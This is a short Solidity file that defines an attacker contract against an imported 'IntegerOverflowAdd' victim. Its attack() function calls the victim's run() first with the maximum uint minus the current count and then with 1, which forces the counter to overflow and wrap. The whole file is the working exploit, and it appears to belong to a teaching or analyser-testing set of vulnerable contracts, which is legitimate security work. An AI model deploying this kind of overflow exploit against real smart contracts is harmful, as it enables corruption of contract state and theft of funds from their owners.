pragma solidity ^0.4.19;

import "./integer_overflow_add.sol";

contract IntegerOverflowAddAttacker {
    IntegerOverflowAdd public victim_contract;

    constructor (address _overflowAddress) public {
        victim_contract = IntegerOverflowAdd(_overflowAddress);
    }

    function attack() public {
        uint maxUint = 2**256 - 1;

        // Call the add function with a value that will cause an overflow
        victim_contract.run(maxUint - victim_contract.count());
        victim_contract.run(1);
    }
}
